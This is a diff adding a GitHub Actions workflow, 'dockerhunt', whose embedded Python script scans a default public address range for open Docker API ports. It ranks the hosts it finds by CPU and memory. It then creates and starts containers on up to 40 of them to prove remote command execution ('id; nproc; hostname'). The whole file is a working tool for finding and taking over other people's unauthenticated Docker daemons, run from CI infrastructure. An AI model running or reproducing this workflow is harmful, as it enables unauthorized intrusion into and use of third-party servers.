@@ -1,0 +1,109 @@
+name: dockerhunt
+
+on:
+  workflow_dispatch:
+    inputs:
+      cidr:
+        description: CIDR to scan
+        required: true
+        default: 192.3.0.0/16
+      port:
+        description: Port
+        required: true
+        default: "2375"
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: scan
+        run: |
+          python3 -m pip install --quiet requests
+          CIDR="${{ inputs.cidr }}" PORT="${{ inputs.port }}" python3 - <<'PY'
+          import asyncio
+          import concurrent.futures
+          import ipaddress
+          import json
+          import os
+          import secrets
+          import time
+
+          import requests
+
+          CIDR = os.environ["CIDR"]
+          PORT = int(os.environ["PORT"])
+          ips = [str(ip) for ip in ipaddress.ip_network(CIDR).hosts()]
+
+          async def probe(ip):
+              try:
+                  reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, PORT), 1.5)
+                  writer.close()
+                  try:
+                      await writer.wait_closed()
+                  except Exception:
+                      pass
+                  return ip
+              except Exception:
+                  return None
+
+          async def run():
+              sem = asyncio.Semaphore(1200)
+              async def guarded(ip):
+                  async with sem:
+                      return await probe(ip)
+              return [ip for ip in await asyncio.gather(*(guarded(ip) for ip in ips)) if ip]
+
+          started = time.time()
+          open_ips = asyncio.run(run())
+          print(f"cidr={CIDR} port={PORT} scanned={len(ips)} open={len(open_ips)} secs={int(time.time()-started)}", flush=True)
+
+          def info(ip):
+              try:
+                  d = requests.get(f"http://{ip}:{PORT}/info", timeout=3).json()
+                  if "NCPU" in d:
+                      return (ip, d.get("NCPU"), round((d.get("MemTotal") or 0) / 1024**3, 1),
+                              d.get("Name"), d.get("OperatingSystem"))
+              except Exception:
+                  return None
+              return None
+
+          live = []
+          with concurrent.futures.ThreadPoolExecutor(max_workers=128) as pool:
+              for row in pool.map(info, open_ips):
+                  if row:
+                      live.append(row)
+                      print("DOCKER", row, flush=True)
+
+          live.sort(key=lambda r: (r[1] or 0) * (r[2] or 0), reverse=True)
+          for row in live[:10]:
+              print("TOP", row, flush=True)
+
+          def verify(row):
+              ip, cores, ram, name, osname = row
+              base = f"http://{ip}:{PORT}"
+              mark = "MARK" + secrets.token_hex(4)
+              try:
+                  bogus = requests.get(base + "/containers/lc-nope/json", timeout=4)
+                  if bogus.status_code != 404:
+                      return (ip, cores, ram, "facade")
+                  body = {"Image": "alpine:latest",
+                          "Cmd": ["/bin/sh", "-c", f"echo {mark}; id; nproc; hostname"],
+                          "HostConfig": {}}
+                  created = requests.post(base + "/containers/create", json=body, timeout=8)
+                  cid = created.json().get("Id", "")
+                  if not cid:
+                      return (ip, cores, ram, "create-fail")
+                  requests.post(base + f"/containers/{cid}/start", timeout=8)
+                  time.sleep(2)
+                  logs = requests.get(base + f"/containers/{cid}/logs?stdout=1&stderr=1", timeout=6).text
+                  if mark in logs:
+                      return (ip, cores, ram, "REAL", logs[:200])
+                  return (ip, cores, ram, "no-marker")
+              except Exception as exc:
+                  return (ip, cores, ram, type(exc).__name__)
+
+          for row in live[:40]:
+              print("VERIFY", verify(row), flush=True)
+          PY
